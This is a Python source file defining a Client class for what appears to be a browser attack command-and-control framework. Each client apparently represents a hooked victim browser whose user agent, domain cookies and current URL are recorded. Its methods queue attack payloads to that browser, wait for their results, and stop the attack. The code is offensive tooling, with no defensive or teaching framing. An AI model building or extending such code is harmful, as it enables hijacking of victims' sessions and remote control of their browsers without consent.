import json
from queue import Queue
import time
class Client:
    def __init__(self,clientid,project,clientinfo) -> None:
        self.clientid=clientid
        self.project=project
        self.useragent=clientinfo['useragent']
        self.curdomaincookies=clientinfo['curdomaincookies']
        self.cururl=clientinfo['cururl']
        self.taskqueue=Queue()
        self.stopattack=False
        self.taskresult={}

    def get_latest_task(self):
        try:
            return self.taskqueue.get(False)
        except:
            return None

    def stop_attack(self):
        self.stopattack=True
        self.taskqueue=Queue()

    
    def send_payload(self,moduleobj,sync=1):
        if self.stopattack:
            raise Exception("Attack on this client should be stopped")
        payload=moduleobj.payload
        payload.set_client(self)
        self.taskqueue.put(payload)
        taskid=payload.taskid
        while sync:
            time.sleep(1)
            if  taskid in self.taskresult:
                return self.taskresult[taskid]
        return taskid